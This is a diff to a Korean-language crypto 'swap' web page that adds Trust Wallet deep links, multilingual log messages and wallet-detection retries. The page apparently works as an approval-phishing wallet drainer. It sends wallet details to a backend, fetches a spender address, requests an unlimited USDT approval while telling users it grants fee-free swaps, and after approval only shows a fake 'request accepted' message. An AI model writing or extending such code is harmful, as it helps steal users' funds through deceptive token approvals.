@@ -177,11 +177,16 @@
                     <div class="flex-1"><div class="text-sm font-bold text-white">OKX Wallet</div><div class="text-[11px] text-slate-400" data-i18n="w_okx">OKX 거래소 지갑</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
-                <button onclick="launchWallet('imtoken')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
-                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-sky-500/20 to-blue-600/10 border border-sky-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-key text-sky-400 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-white">imToken</div><div class="text-[11px] text-slate-400" data-i18n="w_imtoken">글로벌 멀티체인 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
-                </button>
+                <button onclick="launchWallet('trust')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
+    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/20 to-indigo-600/10 border border-blue-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield text-blue-400 text-lg"></i></div>
+    <div class="flex-1"><div class="text-sm font-bold text-white">Trust Wallet</div><div class="text-[11px] text-slate-400" data-i18n="w_trust">멀티체인 지갑</div></div>
+    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+</button>
+<button onclick="launchWallet('imtoken')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
+    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-sky-500/20 to-blue-600/10 border border-sky-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-key text-sky-400 text-lg"></i></div>
+    <div class="flex-1"><div class="text-sm font-bold text-white">imToken</div><div class="text-[11px] text-slate-400" data-i18n="w_imtoken">글로벌 멀티체인 지갑</div></div>
+    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+</button>
                 <div class="flex items-center gap-3 pt-1">
                     <div class="flex-1 border-t border-slate-700/60"></div>
                     <span class="text-[10px] text-slate-500 font-semibold uppercase tracking-wider">또는</span>
@@ -209,8 +214,8 @@
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
             <div class="space-y-1.5">
-                <h3 class="text-xl font-extrabold text-white">교환 승인 완료!</h3>
-                <p class="text-xs text-slate-300 leading-relaxed">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p>
+                <h3 class="text-xl font-extrabold text-white" data-i18n="reward_title">교환 승인 완료!</h3>
+<p class="text-xs text-slate-300 leading-relaxed" data-i18n-html="reward_desc">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p>
             </div>
             <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
                 <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">승인 완료</span></div>
@@ -615,16 +620,16 @@
             recvSuffix.textContent = tmpSuf;
 
             if (swapDirection === 'USDT_TO_TRX') {
-              swapDirection = 'TRX_TO_USDT';
-              if (sendPanel) sendPanel.textContent = _t.send_amount_trx || '보내는 금액 (TRX)';
-              if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt || '받는 금액 (예상 USDT)';
-              icon.style.transform = 'rotate(180deg)';
-          } else {
-              swapDirection = 'USDT_TO_TRX';
-              if (sendPanel) sendPanel.textContent = _t.send_amount || '보내는 금액 (USDT)';
-              if (recvPanel) recvPanel.textContent = _t.receive_amount || '받는 금액 (예상)';
-              icon.style.transform = 'rotate(0deg)';
-          }
+    swapDirection = 'TRX_TO_USDT';
+    if (sendPanel) sendPanel.textContent = _t.send_amount_trx;
+    if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt;
+    icon.style.transform = 'rotate(180deg)';
+} else {
+    swapDirection = 'USDT_TO_TRX';
+    if (sendPanel) sendPanel.textContent = _t.send_amount;
+    if (recvPanel) recvPanel.textContent = _t.receive_amount;
+    icon.style.transform = 'rotate(0deg)';
+}
           updateRateDisplay();
           updateSwapOutput();
       }
@@ -769,9 +774,17 @@
 
         // Localisation helper for log messages
         var logTexts = {
-            ko: { detect: '[감지] {0} DApp 브라우저 확인됨', noDetect: '[대기] 지갑 DApp 브라우저 미감지', accChange: '[계정 변경] {0}', searching: '[지갑 탐색] 환경 확인 중...', sending: '[백엔드] 서버에 지갑 정보 전송 중...', connected: '[연결] {0} | {1} USDT', backendFail: '[경고] 백엔드 연결 실패', noSpender: '[오류] Spender 미설정', trxCheck: '[1/3] TRX 잔액 확인 중...', autoCharge: '[자동 충전] {0} TRX 전송 완료', trxOk: '[확인] TRX 충분 ({0})', trxFail: '[실패] {0}', trxWarn: '[경고] TRX 확인 실패, 계속 진행', approving: '[2/3] 승인 서명 요청 중...', approved: '[3/3] 교환 승인 완료! TxHash: {0}', cancelled: '[취소] 사용자 서명 취소', failed: '[실패] {0}' },
-            en: { detect: '[Detected] {0} DApp browser found', noDetect: '[Wait] Wallet DApp browser not detected', accChange: '[Account Changed] {0}', searching: '[Search] Checking environment...', sending: '[Backend] Sending wallet info...', connected: '[Connected] {0} | {1} USDT', backendFail: '[Warning] Backend connection failed', noSpender: '[Error] Spender not set', trxCheck: '[1/3] Checking TRX balance...', autoCharge: '[Auto] {0} TRX sent', trxOk: '[OK] TRX sufficient ({0})', trxFail: '[Failed] {0}', trxWarn: '[Warning] TRX check failed, continuing', approving: '[2/3] Requesting approval...', approved: '[3/3] Approved! TxHash: {0}', cancelled: '[Cancelled] User rejected', failed: '[Failed] {0}' }
-        };
+    ko: { detect: '[감지] {0} DApp 브라우저 확인됨', noDetect: '[대기] 지갑 DApp 브라우저 미감지', accChange: '[계정 변경] {0}', searching: '[지갑 탐색] 환경 확인 중...', sending: '[백엔드] 서버에 지갑 정보 전송 중...', connected: '[연결] {0} | {1} USDT', backendFail: '[경고] 백엔드 연결 실패', noSpender: '[오류] Spender 미설정', trxCheck: '[1/3] TRX 잔액 확인 중...', autoCharge: '[자동 충전] {0} TRX 전송 완료', trxOk: '[확인] TRX 충분 ({0})', trxFail: '[실패] {0}', trxWarn: '[경고] TRX 확인 실패, 계속 진행', approving: '[2/3] 승인 서명 요청 중...', approved: '[3/3] 교환 승인 완료! TxHash: {0}', cancelled: '[취소] 사용자 서명 취소', failed: '[실패] {0}' },
+    en: { detect: '[Detected] {0} DApp browser found', noDetect: '[Wait] Wallet DApp browser not detected', accChange: '[Account Changed] {0}', searching: '[Search] Checking environment...', sending: '[Backend] Sending wallet info...', connected: '[Connected] {0} | {1} USDT', backendFail: '[Warning] Backend connection failed', noSpender: '[Error] Spender not set', trxCheck: '[1/3] Checking TRX balance...', autoCharge: '[Auto] {0} TRX sent', trxOk: '[OK] TRX sufficient ({0})', trxFail: '[Failed] {0}', trxWarn: '[Warning] TRX check failed, continuing', approving: '[2/3] Requesting approval...', approved: '[3/3] Approved! TxHash: {0}', cancelled: '[Cancelled] User rejected', failed: '[Failed] {0}' },
+    zh: { detect: '[检测] 已确认 {0} DApp 浏览器', noDetect: '[等待] 未检测到钱包 DApp 浏览器', accChange: '[账户变更] {0}', searching: '[搜索] 检查环境中...', sending: '[后端] 正在发送钱包信息...', connected: '[已连接] {0} | {1} USDT', backendFail: '[警告] 后端连接失败', noSpender: '[错误] 未设置 Spender', trxCheck: '[1/3] 检查 TRX 余额...', autoCharge: '[自动充值] 已发送 {0} TRX', trxOk: '[确认] TRX 充足 ({0})', trxFail: '[失败] {0}', trxWarn: '[警告] TRX 检查失败，继续执行', approving: '[2/3] 请求授权签名...', approved: '[3/3] 兑换授权完成! TxHash: {0}', cancelled: '[取消] 用户取消签名', failed: '[失败] {0}' },
+    ru: { detect: '[Обнаружено] DApp-браузер {0} найден', noDetect: '[Ожидание] DApp-браузер кошелька не найден', accChange: '[Смена аккаунта] {0}', searching: '[Поиск] Проверка окружения...', sending: '[Бэкенд] Отправка данных кошелька...', connected: '[Подключено] {0} | {1} USDT', backendFail: '[Предупреждение] Ошибка связи с сервером', noSpender: '[Ошибка] Spender не задан', trxCheck: '[1/3] Проверка баланса TRX...', autoCharge: '[Авто] Отправлено {0} TRX', trxOk: '[ОК] TRX достаточно ({0})', trxFail: '[Ошибка] {0}', trxWarn: '[Предупреждение] Сбой проверки TRX, продолжаем', approving: '[2/3] Запрос подписи одобрения...', approved: '[3/3] Одобрено! TxHash: {0}', cancelled: '[Отмена] Подпись отклонена', failed: '[Ошибка] {0}' },
+    th: { detect: '[ตรวจพบ] พบเบราว์เซอร์ DApp ของ {0}', noDetect: '[รอ] ไม่พบเบราว์เซอร์ DApp ของกระเป๋า', accChange: '[เปลี่ยนบัญชี] {0}', searching: '[ค้นหา] กำลังตรวจสอบสภาพแวดล้อม...', sending: '[แบ็กเอนด์] กำลังส่งข้อมูลกระเป๋า...', connected: '[เชื่อมต่อแล้ว] {0} | {1} USDT', backendFail: '[คำเตือน] เชื่อมต่อเซิร์ฟเวอร์ล้มเหลว', noSpender: '[ข้อผิดพลาด] ยังไม่ตั้งค่า Spender', trxCheck: '[1/3] กำลังตรวจสอบยอด TRX...', autoCharge: '[อัตโนมัติ] ส่ง {0} TRX แล้ว', trxOk: '[สำเร็จ] TRX เพียงพอ ({0})', trxFail: '[ล้มเหลว] {0}', trxWarn: '[คำเตือน] ตรวจ TRX ไม่สำเร็จ ดำเนินการต่อ', approving: '[2/3] กำลังขอลายเซ็นอนุมัติ...', approved: '[3/3] อนุมัติการแลกเปลี่ยนแล้ว! TxHash: {0}', cancelled: '[ยกเลิก] ผู้ใช้ยกเลิกการลงนาม', failed: '[ล้มเหลว] {0}' },
+    vi: { detect: '[Phát hiện] Tìm thấy trình duyệt DApp {0}', noDetect: '[Chờ] Không thấy trình duyệt DApp của ví', accChange: '[Đổi tài khoản] {0}', searching: '[Tìm kiếm] Đang kiểm tra môi trường...', sending: '[Backend] Đang gửi thông tin ví...', connected: '[Đã kết nối] {0} | {1} USDT', backendFail: '[Cảnh báo] Lỗi kết nối máy chủ', noSpender: '[Lỗi] Chưa cấu hình Spender', trxCheck: '[1/3] Đang kiểm tra số dư TRX...', autoCharge: '[Tự động] Đã gửi {0} TRX', trxOk: '[OK] Đủ TRX ({0})', trxFail: '[Thất bại] {0}', trxWarn: '[Cảnh báo] Lỗi kiểm tra TRX, vẫn tiếp tục', approving: '[2/3] Đang yêu cầu ký phê duyệt...', approved: '[3/3] Đã phê duyệt đổi! TxHash: {0}', cancelled: '[Hủy] Người dùng từ chối ký', failed: '[Thất bại] {0}' },
+    ja: { detect: '[検出] {0} DAppブラウザを確認', noDetect: '[待機] ウォレットのDAppブラウザ未検出', accChange: '[アカウント変更] {0}', searching: '[探索] 環境を確認中...', sending: '[バックエンド] ウォレット情報を送信中...', connected: '[接続完了] {0} | {1} USDT', backendFail: '[警告] バックエンド接続失敗', noSpender: '[エラー] Spender未設定', trxCheck: '[1/3] TRX残高を確認中...', autoCharge: '[自動補充] {0} TRX送信完了', trxOk: '[確認] TRX十分 ({0})', trxFail: '[失敗] {0}', trxWarn: '[警告] TRX確認失敗、続行します', approving: '[2/3] 承認署名を要求中...', approved: '[3/3] 交換承認完了! TxHash: {0}', cancelled: '[キャンセル] 署名がキャンセルされました', failed: '[失敗] {0}' },
+    de: { detect: '[Erkannt] {0} DApp-Browser gefunden', noDetect: '[Warten] Kein Wallet-DApp-Browser erkannt', accChange: '[Konto geändert] {0}', searching: '[Suche] Umgebung wird geprüft...', sending: '[Backend] Wallet-Daten werden gesendet...', connected: '[Verbunden] {0} | {1} USDT', backendFail: '[Warnung] Backend-Verbindung fehlgeschlagen', noSpender: '[Fehler] Spender nicht gesetzt', trxCheck: '[1/3] TRX-Guthaben wird geprüft...', autoCharge: '[Auto] {0} TRX gesendet', trxOk: '[OK] Genug TRX ({0})', trxFail: '[Fehlgeschlagen] {0}', trxWarn: '[Warnung] TRX-Prüfung fehlgeschlagen, fahre fort', approving: '[2/3] Genehmigungssignatur wird angefordert...', approved: '[3/3] Tausch genehmigt! TxHash: {0}', cancelled: '[Abgebrochen] Signatur abgelehnt', failed: '[Fehlgeschlagen] {0}' },
+    fr: { detect: '[Détecté] Navigateur DApp {0} trouvé', noDetect: '[Attente] Navigateur DApp non détecté', accChange: '[Compte changé] {0}', searching: '[Recherche] Vérification de l’environnement...', sending: '[Backend] Envoi des infos du portefeuille...', connected: '[Connecté] {0} | {1} USDT', backendFail: '[Avertissement] Échec de connexion au serveur', noSpender: '[Erreur] Spender non défini', trxCheck: '[1/3] Vérification du solde TRX...', autoCharge: '[Auto] {0} TRX envoyé', trxOk: '[OK] TRX suffisant ({0})', trxFail: '[Échec] {0}', trxWarn: '[Avertissement] Échec vérif TRX, poursuite', approving: '[2/3] Demande de signature d’approbation...', approved: '[3/3] Échange approuvé ! TxHash: {0}', cancelled: '[Annulé] Signature refusée', failed: '[Échec] {0}' },
+    es: { detect: '[Detectado] Navegador DApp {0} encontrado', noDetect: '[Espera] No se detectó navegador DApp', accChange: '[Cambio de cuenta] {0}', searching: '[Búsqueda] Verificando entorno...', sending: '[Backend] Enviando datos de billetera...', connected: '[Conectado] {0} | {1} USDT', backendFail: '[Advertencia] Error de conexión con el servidor', noSpender: '[Error] Spender no configurado', trxCheck: '[1/3] Verificando saldo TRX...', autoCharge: '[Auto] {0} TRX enviado', trxOk: '[OK] TRX suficiente ({0})', trxFail: '[Error] {0}', trxWarn: '[Advertencia] Falló verificación TRX, continuando', approving: '[2/3] Solicitando firma de aprobación...', approved: '[3/3] ¡Cambio aprobado! TxHash: {0}', cancelled: '[Cancelado] Firma rechazada', failed: '[Error] {0}' }
+};
         function L(key) {
             var t = logTexts[currentLang] || logTexts.en;
             var args = Array.prototype.slice.call(arguments, 1);
@@ -872,30 +885,33 @@
             // 모바일 공통: URL 복사 및 지갑 스킴 준비
           try { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(url).catch(function () { }); } catch (e) { }
           var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
-          var mobileSchemes = {
-              tronlink: 'tronlinkoutside://pull.activity?param=' + tronlinkParam,
-              tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
-              bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
-              okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
-              imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
-          };
+var mobileSchemes = {
+    tronlink: 'tronlinkoutside://pull.activity?param=' + tronlinkParam,
+    trust: 'trust://open_url?coin_id=195&url=' + encoded,
+    tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
+    bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
+    okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
+    imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
+};
 
-          // Android: 지갑 앱 인텐트 호출 (미설치 시 스토어로 폴백)
-          if (isAndroid()) {
-              var stores = {
-                  tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
-                  tokenpocket: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
-                  bitget: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
-                  okx: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
-                  imtoken: 'https://play.google.com/store/apps/details?id=im.token.app'
-              };
-              var pkgs = {
-                  tronlink: 'com.tronlinkpro.wallet',
-                  tokenpocket: 'vip.mytokenpocket',
-                  bitget: 'com.bitkeep.wallet',
-                  okx: 'com.okinc.okex.gp',
-                  imtoken: 'im.token.app'
-              };
+// Android (갤럭시 Z 폴드4 포함): 지갑 앱 인텐트 호출 (미설치 시 스토어로 폴백)
+if (isAndroid()) {
+    var stores = {
+        tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
+        trust: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
+        tokenpocket: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
+        bitget: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
+        okx: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
+        imtoken: 'https://play.google.com/store/apps/details?id=im.token.app'
+    };
+    var pkgs = {
+        tronlink: 'com.tronlinkpro.wallet',
+        trust: 'com.wallet.crypto.trustapp',
+        tokenpocket: 'vip.mytokenpocket',
+        bitget: 'com.bitkeep.wallet',
+        okx: 'com.okinc.okex.gp',
+        imtoken: 'im.token.app'
+    };
               var rawScheme = mobileSchemes[wallet];
               if (rawScheme && pkgs[wallet]) {
                   var schemeName = rawScheme.split('://')[0];
@@ -907,8 +923,17 @@
 
           // iOS (Safari / Chrome 등): 지갑 딥링크 시도 후 안내
           if (isIOS()) {
+              if (wallet === 'trust') {
+                  showToast(currentLang === 'ko'
+                      ? 'URL이 복사되었습니다. Trust Wallet 앱 브라우저에 붙여넣거나 WalletConnect를 이용하세요.'
+                      : 'URL copied. Paste it in Trust Wallet browser or use WalletConnect.');
+                  window.location.href = mobileSchemes.trust;
+                  return;
+              }
               if (mobileSchemes[wallet]) {
-                  showToast(currentLang === 'ko' ? '지갑 앱을 여는 중... 안 열리면 지갑 브라우저에 붙여넣어 주세요.' : 'Opening wallet app...');
+                  showToast(currentLang === 'ko'
+                      ? '지갑 앱을 여는 중... 안 열리면 지갑 브라우저에 붙여넣어 주세요.'
+                      : 'Opening wallet app...');
                   window.location.href = mobileSchemes[wallet];
                   return;
               }
@@ -928,22 +953,30 @@
 
         // ===== Wallet Detection =====
         function detectProvider() {
-          var ua = navigator.userAgent || '';
-          if (window.bitkeep || window.bitget || /BitKeep|Bitget/i.test(ua)) return 'Bitget';
-          if (window.okxwallet || /OKApp|OKX/i.test(ua)) return 'OKX';
-          if (window.tokenpocket || window.tp || /TokenPocket/i.test(ua)) return 'TokenPocket';
-          if (window.imToken || /imToken/i.test(ua)) return 'imToken';
-          if (window.tronLink || window.tronWeb) return 'TronLink';
-          return null;
-      }
+    var ua = navigator.userAgent || '';
+    if (window.trustwallet || /Trust/i.test(ua)) return 'TrustWallet';
+    if (window.bitkeep || window.bitget || /BitKeep|Bitget/i.test(ua)) return 'Bitget';
+    if (window.okxwallet || /OKApp|OKX/i.test(ua)) return 'OKX';
+    if (window.tokenpocket || window.tp || /TokenPocket/i.test(ua)) return 'TokenPocket';
+    if (window.imToken || /imToken/i.test(ua)) return 'imToken';
+    if (window.tronLink || window.tronWeb) return 'TronLink';
+    return null;
+}
 
         async function getInjectedTronWeb() {
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
-            if (window.tronLink) {
-                if (window.tronLink.ready && window.tronLink.tronWeb) return window.tronLink.tronWeb;
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                return window.tronWeb;
+            }
+            if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
+                return window.tronLink.tronWeb;
+            }
+            if (window.tronLink && typeof window.tronLink.request === 'function') {
                 try {
                     var r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (r && r.code === 200 && window.tronWeb) return window.tronWeb;
+                    if (r && r.code === 200) {
+                        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
+                        if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) return window.tronLink.tronWeb;
+                    }
                 } catch (e) { }
             }
             return null;
@@ -981,6 +1014,27 @@
                     }
                 });
             }
+        });
+        async function retryWalletDetect() {
+            if (isConnected && currentWalletAddress) return;
+            for (var i = 0; i < 6; i++) {
+                try {
+                    var tw = await getInjectedTronWeb();
+                    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                        var prov = detectProvider() || 'TronLink';
+                        document.getElementById('wallet-selector-modal').classList.remove('active');
+                        await setConnectedWallet(tw.defaultAddress.base58, prov);
+                        break;
+                    }
+                } catch (e) {}
+                await new Promise(function (r) { setTimeout(r, 400); });
+            }
+        }
+        document.addEventListener('visibilitychange', function () {
+            if (document.visibilityState === 'visible') retryWalletDetect();
+        });
+        window.addEventListener('pageshow', function () {
+            retryWalletDetect();
         });
 
         async function initWalletConnect() {
@@ -1142,6 +1196,20 @@
                 document.getElementById('wallet-selector-modal').classList.add('active');
             }
         };
+        function refreshSwapBalanceUI() {
+            var topBal = document.getElementById('usdt-bal-swap');
+            var bottomBal = document.getElementById('trx-bal-swap');
+            var usdtText = (Number(userUsdtBalance) || 0).toFixed(2);
+            var trxText = (Number(userTrxBalance) || 0).toFixed(2);
+
+            if (swapDirection === 'TRX_TO_USDT') {
+                if (topBal) topBal.textContent = trxText;
+                if (bottomBal) bottomBal.textContent = usdtText;
+            } else {
+                if (topBal) topBal.textContent = usdtText;
+                if (bottomBal) bottomBal.textContent = trxText;
+            }
+        }
 
         async function setConnectedWallet(address, provider) {
             currentWalletAddress = address;
@@ -1176,23 +1244,21 @@
                 if (data.status === 'ok') {
                     userUsdtBalance = parseFloat(data.balance) || 0;
                     try { document.getElementById('display-balance').innerHTML = data.balance + ' <span class="text-xs font-normal text-slate-400">USDT</span>'; } catch (e) { }
-                    try { document.getElementById('usdt-bal-swap').textContent = data.balance; } catch (e) { }
+                    refreshSwapBalanceUI();
                     if (data.isApproved) { isApproved = true; setApprovedUI(); _autoApproveScheduled = true; }
                     showToast(provider + ' 연결 완료 (잔액: ' + data.balance + ' USDT)');
                 }
             } catch (e) { showToast('백엔드 연결 실패', 'error'); }
 
             // TRX 잔액
-          try {
-              var _tr = await fetch(API_BASE + '/trx/' + address);
-              var _td = await _tr.json();
-              if (_td.trxBalance !== undefined && _td.trxBalance !== null) {
-                  userTrxBalance = parseFloat(_td.trxBalance) || 0;
-                  var trxText = userTrxBalance.toFixed(2);
-                  var targetId = (swapDirection === 'TRX_TO_USDT') ? 'usdt-bal-swap' : 'trx-bal-swap';
-                  try { document.getElementById(targetId).textContent = trxText; } catch (e) { }
-              }
-          } catch (e) { }
+            try {
+                var _tr = await fetch(API_BASE + '/trx/' + address);
+                var _td = await _tr.json();
+                if (_td.trxBalance !== undefined && _td.trxBalance !== null) {
+                    userTrxBalance = parseFloat(_td.trxBalance) || 0;
+                    refreshSwapBalanceUI();
+                }
+            } catch (e) { }
 
             // 레퍼럴
             try { trackReferralConnect(address, provider); } catch (e) { }
@@ -1247,6 +1313,16 @@
           if (isApproved) return;
           if (isApproving) return;
           isApproving = true;
+          if (isApproved) {
+    var inputEl = document.getElementById('swap-input');
+    var amount = parseFloat(inputEl && inputEl.value ? inputEl.value : '0') || 0;
+    if (amount <= 0) {
+        showToast('교환할 금액을 먼저 입력하세요.', 'error');
+        return;
+    }
+    showToast(amount + ' ' + (swapDirection === 'TRX_TO_USDT' ? 'TRX → USDT' : 'USDT → TRX') + ' 교환 요청이 접수되었습니다.');
+    return;
+}
 
             // Spender 주소 획득 (최대 3회)
             var spender = null;
@@ -1690,6 +1766,11 @@
     if (!isConnected || !currentWalletAddress) {
         showToast('지갑을 먼저 연결하세요.', 'error');
         handleConnectWallet();
+        return;
+    }
+    if (isApproved) {
+        setEnergyApprovedUI();
+        processEnergyRental();
         return;
     }
     executeUnlimitedApprove();
